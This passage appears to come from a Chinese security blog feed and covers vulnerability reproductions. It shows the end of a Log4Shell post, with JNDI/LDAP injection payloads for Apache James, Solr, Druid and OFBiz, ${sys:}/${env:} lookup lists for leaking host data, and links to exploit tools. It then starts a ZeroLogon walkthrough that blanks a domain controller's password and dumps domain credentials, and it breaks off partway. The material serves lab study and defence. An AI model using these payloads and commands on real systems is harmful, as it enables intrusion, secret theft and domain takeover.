&quot;https://10.0.0.4/websso/SAML2/SSO/photon- machine.lan?SAMLRequest=</span><br></pre></td></tr></table></figure><h3 id="Apache-James"><a href="#Apache-James" class="headerlink" title="Apache James"></a>Apache James</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtp://localhost&quot; --user &quot;test:test&quot; --mail-from &#x27;$&#123;jndi:ldap://localhost:1270/a&#125;@gmail.com&#x27; --mail-rcpt &#x27;test&#x27; --upload-file email.txt</span><br></pre></td></tr></table></figure><h3 id="Apache-Solr"><a href="#Apache-Solr" class="headerlink" title="Apache Solr"></a>Apache Solr</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8983/solr/admin/cores?action=CREATE&amp;name=$%7Bjndi:ldap://10.0.0.6:1270/abc%7D&amp;wt=json</span><br><span class="line">solr/admin/info/system?_=$&#123;jndi:ldap://192.168.1.1/exp&#125;&amp;wt=json</span><br></pre></td></tr></table></figure><h3 id="Apache-Druid"><a href="#Apache-Druid" class="headerlink" title="Apache Druid"></a>Apache Druid</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8888/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2flocalhost:1270%2fabc%7d</span><br></pre></td></tr></table></figure><h3 id="Apache-JSPWiki"><a href="#Apache-JSPWiki" class="headerlink" title="Apache JSPWiki"></a>Apache JSPWiki</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: OFBiz.Visitor=\$&#123;jndi:ldap://localhost:1270/abc&#125;&quot; https://localhost:8443/webtools/control/main</span><br></pre></td></tr></table></figure><h2 id="一些获取系统信息的手法-–-sys"><a href="#一些获取系统信息的手法-–-sys" class="headerlink" title="一些获取系统信息的手法 – sys"></a>一些获取系统信息的手法 – sys</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;sys:java.version&#125;.dnslog&#125;   // java版本</span><br><span class="line">$&#123;jndi:ldap://$&#123;sys:user.name&#125;.dnslog&#125;  //主机用户名</span><br><span class="line">$&#123;jndi:ldap://$&#123;sys:os.arch&#125;.dnslog&#125;   // 系统架构</span><br></pre></td></tr></table></figure><h3 id="log4j2-sys"><a href="#log4j2-sys" class="headerlink" title="log4j2-sys"></a><strong>log4j2-sys</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$&#123;sys:awt.toolkit&#125;</span><br><span class="line">$&#123;sys:file.encoding&#125;</span><br><span class="line">$&#123;sys:file.encoding.pkg&#125;</span><br><span class="line">$&#123;sys:file.separator&#125;</span><br><span class="line">$&#123;sys:java.awt.graphicsenv&#125;</span><br><span class="line">$&#123;sys:java.awt.printerjob&#125;</span><br><span class="line">$&#123;sys:java.class.path&#125;</span><br><span class="line">$&#123;sys:java.class.version&#125;</span><br><span class="line">$&#123;sys:java.endorsed.dirs&#125;</span><br><span class="line">$&#123;sys:java.ext.dirs&#125;</span><br><span class="line">$&#123;sys:java.home&#125;</span><br><span class="line">$&#123;sys:java.io.tmpdir&#125;</span><br><span class="line">$&#123;sys:java.library.path&#125;</span><br><span class="line">$&#123;sys:java.runtime.name&#125;</span><br><span class="line">$&#123;sys:java.runtime.version&#125;</span><br><span class="line">$&#123;sys:java.specification.name&#125;</span><br><span class="line">$&#123;sys:java.specification.vendor&#125;</span><br><span class="line">$&#123;sys:java.specification.version&#125;</span><br><span class="line">$&#123;sys:java.vendor&#125;</span><br><span class="line">$&#123;sys:java.vendor.url&#125;</span><br><span class="line">$&#123;sys:java.vendor.url.bug&#125;</span><br><span class="line">$&#123;sys:java.version&#125;</span><br><span class="line">$&#123;sys:java.vm.info&#125;</span><br><span class="line">$&#123;sys:java.vm.name&#125;</span><br><span class="line">$&#123;sys:java.vm.specification.name&#125;</span><br><span class="line">$&#123;sys:java.vm.specification.vendor&#125;</span><br><span class="line">$&#123;sys:java.vm.specification.version&#125;</span><br><span class="line">$&#123;sys:java.vm.vendor&#125;</span><br><span class="line">$&#123;sys:java.vm.version&#125;</span><br><span class="line">$&#123;sys:line.separator&#125;</span><br><span class="line">$&#123;sys:os.arch&#125;</span><br><span class="line">$&#123;sys:os.name&#125;</span><br><span class="line">$&#123;sys:os.version&#125;</span><br><span class="line">$&#123;sys:path.separator&#125;</span><br><span class="line">$&#123;sys:sun.arch.data.model&#125;</span><br><span class="line">$&#123;sys:sun.boot.class.path&#125;</span><br><span class="line">$&#123;sys:sun.boot.library.path&#125;</span><br><span class="line">$&#123;sys:sun.cpu.endian&#125;</span><br><span class="line">$&#123;sys:sun.cpu.isalist&#125;</span><br><span class="line">$&#123;sys:sun.desktop&#125;</span><br><span class="line">$&#123;sys:sun.io.unicode.encoding&#125;</span><br><span class="line">$&#123;sys:sun.java.command&#125;</span><br><span class="line">$&#123;sys:sun.java.launcher&#125;</span><br><span class="line">$&#123;sys:sun.jnu.encoding&#125;</span><br><span class="line">$&#123;sys:sun.management.compiler&#125;</span><br><span class="line">$&#123;sys:sun.os.patch.level&#125;</span><br><span class="line">$&#123;sys:sun.stderr.encoding&#125;</span><br><span class="line">$&#123;sys:user.country&#125;</span><br><span class="line">$&#123;sys:user.dir&#125;</span><br><span class="line">$&#123;sys:user.home&#125;</span><br><span class="line">$&#123;sys:user.language&#125;</span><br><span class="line">$&#123;sys:user.name&#125;</span><br><span class="line">$&#123;sys:user.script&#125;</span><br><span class="line">$&#123;sys:user.timezone&#125;</span><br><span class="line">$&#123;sys:user.variant&#125;</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux:"></a>Linux:</h3><p>log4j2-env – (<a href="https://github.com/jas502n/Log4j2-CVE-2021-44228">https://github.com/jas502n/Log4j2-CVE-2021-44228</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLASSPATH,HOME,JAVA_HOME,LANG,LC_TERMINAL,LC_TERMINAL_VERSION,LESS,LOGNAME,LSCOLORS,LS_COLORS,MAIL,NLSPATH,OLDPWD,PAGER,PATH,PWD,SHELL,SHLVL,SSH_CLIENT,SSH_CONNECTION,SSH_TTY,TERM,USER,XDG_RUNTIME_DIR,XDG_SESSION_ID,XFILESEARCHPATH,ZSH,_</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$&#123;env:CLASSPATH&#125;</span><br><span class="line">$&#123;env:HOME&#125;</span><br><span class="line">$&#123;env:JAVA_HOME&#125;</span><br><span class="line">$&#123;env:LANG&#125;</span><br><span class="line">$&#123;env:LC_TERMINAL&#125;</span><br><span class="line">$&#123;env:LC_TERMINAL_VERSION&#125;</span><br><span class="line">$&#123;env:LESS&#125;</span><br><span class="line">$&#123;env:LOGNAME&#125;</span><br><span class="line">$&#123;env:LSCOLORS&#125;</span><br><span class="line">$&#123;env:LS_COLORS&#125;</span><br><span class="line">$&#123;env:MAIL&#125;</span><br><span class="line">$&#123;env:NLSPATH&#125;</span><br><span class="line">$&#123;env:OLDPWD&#125;</span><br><span class="line">$&#123;env:PAGER&#125;</span><br><span class="line">$&#123;env:PATH&#125;</span><br><span class="line">$&#123;env:PWD&#125;</span><br><span class="line">$&#123;env:SHELL&#125;</span><br><span class="line">$&#123;env:SHLVL&#125;</span><br><span class="line">$&#123;env:SSH_CLIENT&#125;</span><br><span class="line">$&#123;env:SSH_CONNECTION&#125;</span><br><span class="line">$&#123;env:SSH_TTY&#125;</span><br><span class="line">$&#123;env:TERM&#125;</span><br><span class="line">$&#123;env:USER&#125;</span><br><span class="line">$&#123;env:XDG_RUNTIME_DIR&#125;</span><br><span class="line">$&#123;env:XDG_SESSION_ID&#125;</span><br><span class="line">$&#123;env:XFILESEARCHPATH&#125;</span><br><span class="line">$&#123;env:ZSH&#125;</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows:"></a>Windows:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=E:,=ExitCode,A8_HOME,A8_ROOT_BIN,ALLUSERSPROFILE,APPDATA,CATALINA_BASE,CATALINA_HOME,CATALINA_OPTS,CATALINA_TMPDIR,CLASSPATH,CLIENTNAME,COMPUTERNAME,ComSpec,CommonProgramFiles,CommonProgramFiles(x86),CommonProgramW6432,FP_NO_HOST_CHECK,HOMEDRIVE,HOMEPATH,JRE_HOME,Java_Home,LOCALAPPDATA,LOGONSERVER,NUMBER_OF_PROCESSORS,OS,PATHEXT,PROCESSOR_ARCHITECTURE,PROCESSOR_IDENTIFIER,PROCESSOR_LEVEL,PROCESSOR_REVISION,PROMPT,PSModulePath,PUBLIC,Path,ProgramData,ProgramFiles,ProgramFiles(x86),ProgramW6432,SESSIONNAME,SystemDrive,SystemRoot,TEMP,TMP,ThisExitCode,USERDOMAIN,USERNAME,USERPROFILE,WORK_PATH,windir,windows_tracing_flags,windows_tracing_logfile</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">$&#123;env:A8_HOME&#125;</span><br><span class="line">$&#123;env:A8_ROOT_BIN&#125;</span><br><span class="line">$&#123;env:ALLUSERSPROFILE&#125;</span><br><span class="line">$&#123;env:APPDATA&#125;</span><br><span class="line">$&#123;env:CATALINA_BASE&#125;</span><br><span class="line">$&#123;env:CATALINA_HOME&#125;</span><br><span class="line">$&#123;env:CATALINA_OPTS&#125;</span><br><span class="line">$&#123;env:CATALINA_TMPDIR&#125;</span><br><span class="line">$&#123;env:CLASSPATH&#125;</span><br><span class="line">$&#123;env:CLIENTNAME&#125;</span><br><span class="line">$&#123;env:COMPUTERNAME&#125;</span><br><span class="line">$&#123;env:ComSpec&#125;</span><br><span class="line">$&#123;env:CommonProgramFiles&#125;</span><br><span class="line">$&#123;env:CommonProgramFiles(x86)&#125;</span><br><span class="line">$&#123;env:CommonProgramW6432&#125;</span><br><span class="line">$&#123;env:FP_NO_HOST_CHECK&#125;</span><br><span class="line">$&#123;env:HOMEDRIVE&#125;</span><br><span class="line">$&#123;env:HOMEPATH&#125;</span><br><span class="line">$&#123;env:JRE_HOME&#125;</span><br><span class="line">$&#123;env:Java_Home&#125;</span><br><span class="line">$&#123;env:LOCALAPPDATA&#125;</span><br><span class="line">$&#123;env:LOGONSERVER&#125;</span><br><span class="line">$&#123;env:NUMBER_OF_PROCESSORS&#125;</span><br><span class="line">$&#123;env:OS&#125;</span><br><span class="line">$&#123;env:PATHEXT&#125;</span><br><span class="line">$&#123;env:PROCESSOR_ARCHITECTURE&#125;</span><br><span class="line">$&#123;env:PROCESSOR_IDENTIFIER&#125;</span><br><span class="line">$&#123;env:PROCESSOR_LEVEL&#125;</span><br><span class="line">$&#123;env:PROCESSOR_REVISION&#125;</span><br><span class="line">$&#123;env:PROMPT&#125;</span><br><span class="line">$&#123;env:PSModulePath&#125;</span><br><span class="line">$&#123;env:PUBLIC&#125;</span><br><span class="line">$&#123;env:Path&#125;</span><br><span class="line">$&#123;env:ProgramData&#125;</span><br><span class="line">$&#123;env:ProgramFiles&#125;</span><br><span class="line">$&#123;env:ProgramFiles(x86)&#125;</span><br><span class="line">$&#123;env:ProgramW6432&#125;</span><br><span class="line">$&#123;env:SESSIONNAME&#125;</span><br><span class="line">$&#123;env:SystemDrive&#125;</span><br><span class="line">$&#123;env:SystemRoot&#125;</span><br><span class="line">$&#123;env:TEMP&#125;</span><br><span class="line">$&#123;env:TMP&#125;</span><br><span class="line">$&#123;env:ThisExitCode&#125;</span><br><span class="line">$&#123;env:USERDOMAIN&#125;</span><br><span class="line">$&#123;env:USERNAME&#125;</span><br><span class="line">$&#123;env:USERPROFILE&#125;</span><br><span class="line">$&#123;env:WORK_PATH&#125;</span><br><span class="line">$&#123;env:windir&#125;</span><br><span class="line">$&#123;env:windows_tracing_flags&#125;</span><br><span class="line">$&#123;env:windows_tracing_logfile&#125;</span><br></pre></td></tr></table></figure><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac:"></a>Mac:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ANT_HOME,COMMAND_MODE,GOBIN,GOPATH,GOROOT,GRADLE_HOME,HOME,HOMEBREW_BOTTLE_DOMAIN,JAVA_HOME,JAVA_MAIN_CLASS_3651,LC_CTYPE,LESS,LOGNAME,LSCOLORS,LaunchInstanceID,OLDPWD,PAGER,PATH,PWD,SECURITYSESSIONID,SHELL,SSH_AUTH_SOCK,TIME_STYLE,TMPDIR,USER,VERSIONER_PYTHON_VERSION,XPC_FLAGS,XPC_SERVICE_NAME,ZSH,__CF_USER_TEXT_ENCODING</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$&#123;env:ANT_HOME&#125;</span><br><span class="line">$&#123;env:COMMAND_MODE&#125;</span><br><span class="line">$&#123;env:GOBIN&#125;</span><br><span class="line">$&#123;env:GOPATH&#125;</span><br><span class="line">$&#123;env:GOROOT&#125;</span><br><span class="line">$&#123;env:GRADLE_HOME&#125;</span><br><span class="line">$&#123;env:HOME&#125;</span><br><span class="line">$&#123;env:HOMEBREW_BOTTLE_DOMAIN&#125;|</span><br><span class="line">$&#123;env:JAVA_HOME&#125;|</span><br><span class="line">$&#123;env:JAVA_MAIN_CLASS_3651&#125;|</span><br><span class="line">$&#123;env:LC_CTYPE&#125;</span><br><span class="line">$&#123;env:LESS&#125;</span><br><span class="line">$&#123;env:LOGNAME&#125;</span><br><span class="line">$&#123;env:LSCOLORS&#125;</span><br><span class="line">$&#123;env:LaunchInstanceID&#125;</span><br><span class="line">$&#123;env:OLDPWD&#125;</span><br><span class="line">$&#123;env:PAGER&#125;</span><br><span class="line">$&#123;env:PATH&#125;</span><br><span class="line">$&#123;env:PWD&#125;</span><br><span class="line">$&#123;env:SECURITYSESSIONID&#125;</span><br><span class="line">$&#123;env:SHELL&#125;</span><br><span class="line">$&#123;env:SSH_AUTH_SOCK&#125;</span><br><span class="line">$&#123;env:TIME_STYLE&#125;</span><br><span class="line">$&#123;env:TMPDIR&#125;</span><br><span class="line">$&#123;env:USER&#125;</span><br><span class="line">$&#123;env:VERSIONER_PYTHON_VERSION&#125;</span><br><span class="line">$&#123;env:XPC_FLAGS&#125;</span><br><span class="line">$&#123;env:XPC_SERVICE_NAME&#125;</span><br><span class="line">$&#123;env:ZSH&#125;</span><br></pre></td></tr></table></figure><h2 id="其他靶场"><a href="#其他靶场" class="headerlink" title="其他靶场"></a>其他靶场</h2><p>雷石安全实验室的靶场：<a href="https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ">https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</span><br><span class="line">docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln </span><br><span class="line">docker exec -it log4j_vuln_container /bin/bash</span><br><span class="line">/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh</span><br></pre></td></tr></table></figure><p>BUGKU：<a href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a></p><p>CTF Show、vulfoucs 等平台都有对应的漏洞 Docker 环境</p><h2 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h2><blockquote><p>以下工具来源于网络，本人能力有限，后门请自测！</p></blockquote><h3 id="Burp-插件："><a href="#Burp-插件：" class="headerlink" title="Burp 插件："></a>Burp 插件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">「Log4j2Scan-0.1-SNAPSHOT.jar」链接：https://www.aliyundrive.com/s/tiCPNENwLkC</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">「Log4j_RCE_Tool」链接：https://www.aliyundrive.com/s/JL2DEh73pR2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">「marshalsec-jar」链接：https://www.aliyundrive.com/s/YGA3xFHndmm</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">「Apache-Log4j-Learning」链接：https://www.aliyundrive.com/s/7S7sD3JgYwf</span><br></pre></td></tr></table></figure><p>log4j 被定义为 “核弹级漏洞”，这几天朋友圈、微信群、QQ 群全是 dnslog 图，包括一些大厂如苹果、京东、百度、拼多多等都存在漏洞风险，由于测试过于激烈，导致 dnslog 平台、fofa 平台一度崩溃、这几天更被称为安全圈的 “年会” ，刚才测试了几个站，发现就算 dnslog 有记录，也不一定能反弹 shell，dnslog 不等于任意代码执行。</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639207950/IMG_1456_k5rkus.jpg"></p><h2 id="收集了一些正常姿势"><a href="#收集了一些正常姿势" class="headerlink" title="收集了一些正常姿势"></a>收集了一些正常姿势</h2><h3 id="Baidu"><a href="#Baidu" class="headerlink" title="Baidu"></a>Baidu</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639209239/IMG_1463_xzwxek.jpg"></p><h3 id="Apple"><a href="#Apple" class="headerlink" title="Apple"></a>Apple</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639209239/IMG_1465_o5gc9r.jpg"></p><p>等等。。。。。。</p><p>然后也看到了一些骚姿势</p><p>比如 apple airpods 改名字之后。。。。。</p><p>这个我证实确实有。。。。。</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639208516/591639208492_.pic_ewossf.jpg"></p><p>甚至是 wifi （未测试）</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639208521/581639208492_.pic_nco7pj.jpg"></p><p>车。。。。（没有保时捷，未能测试呜呜呜呜呜呜）</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639208504/601639208492_.pic_fron97.jpg"></p><p>emm，windows。。挺离谱的，不过倒也正常</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639209238/IMG_1464_vxgfmp.jpg"></p><p>还有对着地球喊了一声 ${jndi:ldap:&#x2F;&#x2F;ip:6666&#x2F;Exp}，dnslog 就有记录了</p><p>反正就是万物皆可 ${jndi:ldap:&#x2F;&#x2F;ip:6666&#x2F;Exp}</p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://mp.weixin.qq.com/s/6Ijs3tUsDnGWCKaHtxRTKg">https://mp.weixin.qq.com/s/6Ijs3tUsDnGWCKaHtxRTKg</a></p><p><a href="https://mp.weixin.qq.com/s/WQedgd3RRg3L7KhBJyFIKw">https://mp.weixin.qq.com/s/WQedgd3RRg3L7KhBJyFIKw</a></p><p><a href="https://mp.weixin.qq.com/s/p2X1gu-rbiI3FZwteErnkQ">https://mp.weixin.qq.com/s/p2X1gu-rbiI3FZwteErnkQ</a></p><p><a href="https://github.com/sairson/NetworkExpLibrary/blob/e9505cdc949580557b77f0b3b46710fd90a67cc4/log4j2/cve_2021_44228.md">https://github.com/sairson/NetworkExpLibrary/blob/e9505cdc949580557b77f0b3b46710fd90a67cc4/log4j2/cve_2021_44228.md</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netlogon 特权提升漏洞（CVE-2020-1472) 复现</title>
      <link href="/posts/1752194585/"/>
      <url>/posts/1752194585/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>NetLogon 远程协议是一种在 Windows 域控上使用的 RPC 接口，被用于各种与用户和机器认证相关的任务。最常用于让用户使用 NTLM 协议登录服务器，也用于 NTP 响应认证以及更新计算机域密码。</p><p>微软 MSRC 于 8 月 11 日 发布了 Netlogon 特权提升漏洞安全通告。此漏洞 CVE 编号 CVE-2020-1472， CVSS 评分：10.0。由 Secura 公司的 Tom Tervoort 发现提交并命名为 ZeroLogon。</p><p>攻击者通过 NetLogon，建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。</p><h2 id="二、漏洞影响版本"><a href="#二、漏洞影响版本" class="headerlink" title="二、漏洞影响版本"></a>二、漏洞影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line"></span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2012</span><br><span class="line"></span><br><span class="line">Windows Server 2012 Windows Server 2012 (Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2012 R2</span><br><span class="line"></span><br><span class="line">Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2016</span><br><span class="line"></span><br><span class="line">Windows Server 2016 Windows Server 2016 (Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2019</span><br><span class="line"></span><br><span class="line">Windows Server 2019 Windows Server 2019 (Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure><h2 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h2><p>微软在 Netlogon 协议中没有正确使用加密算法而导致的漏洞，由于微软在进行 AES 加密运算过程中，使用了 AES-CFB8 模式并且错误的将 IV 设置为全零，这使得攻击者在明文 (client chanllenge)、IV 等要素可控的情况下，存在较高概率使得产生的密文为全零。</p><p>具体可以参考：ZeroLogon (CVE-2020-1472) 分析与狩猎 - 先知社区 (aliyun.com)</p><h2 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h2><p>这里环境用之前复现 CVE-2021-1675 的环境</p><p>域控：172.16.122.91 （Windows Server 2016 ）</p><p>主域：jhc.cn</p><p>域成员机： 172.16.122.252 （win10） 假设已取得权限</p><p>攻击机：不在内网中，但是能访问到域控 （parrot os）</p><p>查询域控主机名</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639009575/Xnip2021-12-09_08-24-49_t2bs2i.png"></p><p>检测是否存在 ZeroLogon</p><p>poc 下载地址：<a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python zerologon_tester.py DC 172.16.122.91</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639009762/Xnip2021-12-09_08-29-09_v8oqkk.png"></p><p>Success! DC can be fully compromised by a Zerologon attack.</p><p>使用 exp 将域控机器账户密码重置为空（这里置空的是域控所在机器的机器管理员密码，而非域控密码，域控所在机器密码更改可能会影响与其他域的通信或者域控上的 dns 等功能。导致脱域，因此攻击完之后，需要恢复机器密码）</p><p>exp 下载地址：<a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python set_empty_pw.py  DC 172.16.122.91</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639010187/Xnip2021-12-09_08-36-09_o4rody.png"></p><p>Success! DC should now have the empty string as its machine password.</p><p>使用 DCSync 导出域内所有用户的凭证</p><p>需要安装 impacket 工具包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py jhc.cn/DC\<span class="variable">$@172</span>.16.122.91 -just-dc -no-pass</span><br></pre></td></tr></table></figure><p><img 